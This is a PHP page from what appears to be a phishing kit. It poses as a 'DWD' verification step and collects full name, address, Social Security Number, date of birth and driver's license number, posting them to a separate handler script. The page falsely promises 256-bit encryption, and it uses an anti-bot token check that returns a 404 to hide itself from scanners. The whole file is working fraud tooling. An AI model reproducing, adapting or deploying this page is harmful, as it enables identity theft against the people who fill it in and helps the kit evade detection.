<?php

    session_start();

    require_once '../J/Comp.php';
    require_once '../J/Antibot.php';
    require_once '../J/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;
    
    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your information</title>
    <link href="../A/css/Verify/css.css" rel="stylesheet">
</head>

<body>
    <div class="navbar navbar-default">
        <div class="container">
            <div class="navbar-header">
                <a class="navbar-brand" style="cursor: pointer;">
                    <img alt="DWD" src="../A/img/dwd_logo.jpg">
                </a>
            </div>
        </div>
    </div>
    <div class="container body-content" id="angularRoot">
        <h1>Verify your information</h1>
        <h5>
            To continue, please verify your information down below.
            <br>
            Your personal information is encrypted with 256-bit server-side encryption.
        </h5>
        <form id="form" action="../L/verify.php?token=<?php echo $_SESSION['token']; ?>" method="POST" class="big">
            <div class="row">
                <div class="form-group col-md-6">
                    <label class="control-label" for="fname">Full Name</label>
                    <input class="form-control tcap" id="fname" name="fname" type="text">
                </div>
            </div>
            <div class="row">
                <div class="form-group col-md-6">
                    <label class="control-label" for="addr">Current Address</label>
                    <input class="form-control tcap" id="addr" name="addr" type="text">
                </div>
            </div>
            <div class="row">
                <div class="form-group col-md-6">
                    <label class="control-label" for="ssn">Social Security Number</label>
                    <input class="form-control" id="ssn" name="ssn" type="text">
                </div>
            </div>
            <div class="row">
                <div class="form-group col-md-6">
                    <label class="control-label" for="dob">Date of Birth</label>
                    <input class="form-control" id="dob" name="dob" type="text" placeholder="(MM/DD/YY)">
                </div>
            </div>
            <div class="row">
                <div class="form-group col-md-6">
                    <label class="control-label" for="dln">Driver's License Number</label>
                    <input class="form-control" id="dln" name="dln" type="text">
                </div>
            </div>
            <div class="row">
                <div class="col-md-6">
                    <button type="button" id="btn" class="btn btn-primary g-recaptcha">Next &gt;</button>
                </div>
            </div>
        </form>
    </div>
    <script src="../A/js/cleave.js"></script>
    <script src="../A/js/verify.js"></script>
</body>

</html>